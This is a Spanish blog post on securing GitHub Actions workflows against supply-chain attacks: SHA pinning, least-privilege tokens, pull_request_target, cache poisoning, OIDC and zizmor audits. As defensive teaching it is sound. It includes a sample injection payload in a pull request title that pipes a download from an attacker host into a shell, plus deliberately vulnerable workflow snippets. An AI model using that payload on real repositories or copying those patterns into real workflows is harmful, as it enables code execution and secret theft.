---
title: "Proteger tus GitHub Actions: tras los ataques a la cadena de suministro"
seoTitle: "Seguridad en GitHub Actions"
description: "Qué medidas reducen el riesgo en GitHub Actions: fijar acciones por SHA, permisos mínimos, pull_request_target, cachés envenenadas y auditoría con zizmor."
date: 2026-06-29
tags: ["GitHub Actions", "Seguridad", "CI/CD"]
---

Un job de CI suele tener acceso a secretos, tokens de despliegue y al código fuente. Además, ejecuta código de terceros. En los últimos años, atacantes han ido a por eso: en marzo de 2025, `tj-actions/changed-files` se modificó para robar secretos, y en marzo de 2026 ocurrió algo parecido con la acción de Trivy, cuando alguien reescribió sus etiquetas. La causa de fondo es una confianza excesiva que se puede reducir.

## Fijar acciones por SHA

Las etiquetas se pueden mover. Si `@v4` pasa a apuntar a código malicioso, tu siguiente ejecución lo usará. Un SHA completo es inmutable:

```yaml
# Se puede mover
- uses: tj-actions/changed-files@v44

# Fijo, con la versión como comentario
- uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
```

Herramientas como `pinact` hacen la conversión, y Dependabot o Renovate pueden seguir actualizando el SHA:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    cooldown:
      default-days: 7
```

Esperar unos días antes de adoptar una versión nueva da margen para que se detecte un compromiso. Fijar por SHA no te protege si esa acción descarga otra cosa sin fijar, así que revisa también qué acciones utilizas.

## Permisos mínimos

Declara los permisos en la raíz del workflow. Si un job necesita más, se los concedes solo a él:

```yaml
permissions:
  contents: read

jobs:
  publicar:
    permissions:
      contents: read
      packages: write
```

En la configuración de la organización, cambia los permisos por defecto de `GITHUB_TOKEN` a solo lectura. También puedes exigir que las acciones se fijen por SHA con una política, y limitar qué acciones se pueden usar.

## El peligro de `pull_request_target`

Este evento se ejecuta con los permisos del repositorio de destino, y con acceso a secretos, aunque el pull request venga de un fork. Mezclarlo con código del pull request es una vulnerabilidad clásica:

```yaml
# Peligroso: ejecuta código del fork con secretos
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test
```

Un `npm install` es suficiente para que el atacante ejecute lo que quiera. Si quieres probar el código de un fork, usa `pull_request`, que no tiene acceso a los secretos. Y si no sabes si necesitas `pull_request_target`, seguramente no lo necesitas.

## Inyección de expresiones

Las expresiones `${{ }}` se expanden antes de que el shell se ejecute. Un título de pull request puede convertirse en un comando:

```yaml
# Vulnerable
- run: echo "Título: ${{ github.event.pull_request.title }}"

# Seguro: pasa por una variable de entorno
- run: echo "Título: $TITULO"
  env:
    TITULO: ${{ github.event.pull_request.title }}
```

Un título como `"; curl atacante.com | sh; #` sería ejecutado en el primer caso. Trata como no fiables los títulos, las ramas, los comentarios y los cuerpos de los mensajes.

## Cachés envenenadas

Un ataque de 2026 contra paquetes de TanStack mostró otro camino: envenenar la caché de compilación desde un pull request, de modo que la usara después un workflow con más privilegios. Por eso, conviene:

- no restaurar cachés generadas por código no fiable en los workflows de publicación;
- compilar los artefactos de publicación sin caché, o con una clave reservada;
- separar claramente el workflow de pruebas del de publicación.

## Secretos y OIDC

Un secreto de larga duración robado sigue siendo válido hasta que alguien lo revoque, si es que se da cuenta. Con OIDC, el workflow obtiene credenciales temporales de la nube:

```yaml
permissions:
  id-token: write
  contents: read
```

Y limita los secretos al paso que los usa, no a todo el job. Usa *environments* con revisores obligatorios para producción: un pull request no debería poder desplegar por sí mismo.

## Auditar

`zizmor` es un analizador estático para workflows, que detecta muchos de los problemas anteriores:

```bash
pipx run zizmor .github/workflows/
```

Se puede ejecutar en CI, y permite ver qué hallazgos ya tienes. StepSecurity Harden-Runner monitoriza además las conexiones de salida de los ejecutores, lo que puede delatar una exfiltración.

## Un orden de prioridades

Si no puedes hacerlo todo a la vez:

1. `GITHUB_TOKEN` en solo lectura por defecto, y permisos por job.
2. Revisar los usos de `pull_request_target` y la inyección de expresiones.
3. Fijar por SHA, empezando por las acciones de terceros.
4. Pasar los despliegues a OIDC.
5. Entornos protegidos para producción.
6. `zizmor` en CI para que no se reintroduzcan los fallos.

## Referencias

- [Fortalecimiento de seguridad de GitHub Actions](https://docs.github.com/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- [zizmor](https://docs.zizmor.sh/)
- [pinact](https://github.com/suzuki-shunsuke/pinact)
